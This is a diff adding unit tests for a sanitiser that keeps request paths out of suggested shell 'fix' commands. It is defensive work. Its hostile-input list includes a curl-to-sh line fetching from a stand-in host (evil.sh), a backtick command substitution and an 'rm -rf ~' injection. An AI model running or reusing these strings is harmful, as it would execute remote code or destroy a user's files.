@@ -9,6 +9,7 @@ import {
   MAX_RENDERED_LENGTH,
   renderCauseValue,
   renderFixLiteral,
+  renderFixShellArg,
   renderMetaRecord,
   renderThrowable,
   singleLine,
@@ -260,6 +261,70 @@ describe('renderFixLiteral', () => {
     }
     expect(renderFixLiteral(undefined, '<org>')).toBe('<org>');
     expect(renderFixLiteral(7, '<org>')).toBe('<org>');
+  });
+});
+
+describe('renderFixShellArg', () => {
+  // A `fix:` is pasted into a terminal, so a value in a COMMAND position is a value that runs.
+  // Reproduced against the shipped router: `GET /$(curl -s http://evil.sh|sh)` rendered
+  // `fix: x routes list --json   # then: x g route /$(curl -s http://evil.sh|sh)`, from an
+  // unauthenticated request, in a line the framework tells its reader to run.
+  const HOSTILE = [
+    '/$(curl -s http://evil.sh|sh)',
+    '/`id`',
+    '/a;rm -rf ~',
+    '/a b',
+    '/a&&b',
+    '/a>out',
+    "/it's",
+    '/a\nb',
+    '/a|b',
+    '/a#b',
+    // A GLOB is not injection and is still a different command: `?` and `*` expand against the
+    // files in whatever directory the reader pasted the line into, and zsh refuses the word
+    // outright when nothing matches. A closed safe set costs one honest placeholder here.
+    '/*',
+    'https://op.test/x?y=1',
+  ];
+
+  test('a shell-inert value is passed through, so the fix stays runnable', () => {
+    for (const path of [
+      '/blog/hello-world',
+      '/api/v1/posts',
+      '/a_b-c.d',
+      'https://op.test/.well-known/openid-configuration',
+    ]) {
+      expect(renderFixShellArg(path, '<path>')).toBe(path);
+    }
+  });
+
+  test('anything a shell would READ becomes the placeholder, never the value', () => {
+    for (const path of HOSTILE) {
+      const rendered = renderFixShellArg(path, '<the path the cause names>');
+      expect(rendered).toBe('<the path the cause names>');
+      // Not "quoted, so it is safe": quoting is what `renderFixLiteral` does, and double quotes
+      // leave `$(…)` and backticks live in every POSIX shell.
+      expect(rendered).not.toContain(path);
+    }
+  });
+
+  test('a leading dash or tilde is the placeholder too — it changes what the command means', () => {
+    // Not injection: `--force` in an argument position is an OPTION, and `~` expands. A fix that
+    // silently means something else than it reads is not a fix.
+    expect(renderFixShellArg('--force', '<name>')).toBe('<name>');
+    expect(renderFixShellArg('~/secrets', '<name>')).toBe('<name>');
+  });
+
+  test('substitutes the placeholder for anything that is not a string', () => {
+    for (const value of hostile().values()) {
+      expect(renderFixShellArg(value, '<name>')).toBe('<name>');
+    }
+    expect(renderFixShellArg(undefined, '<name>')).toBe('<name>');
+    expect(renderFixShellArg(7, '<name>')).toBe('<name>');
+  });
+
+  test('an oversized value degrades rather than pasting a wall of text into a command', () => {
+    expect(renderFixShellArg(`/${'a'.repeat(MAX_RENDERED_LENGTH)}`, '<name>')).toBe('<name>');
   });
 });
 
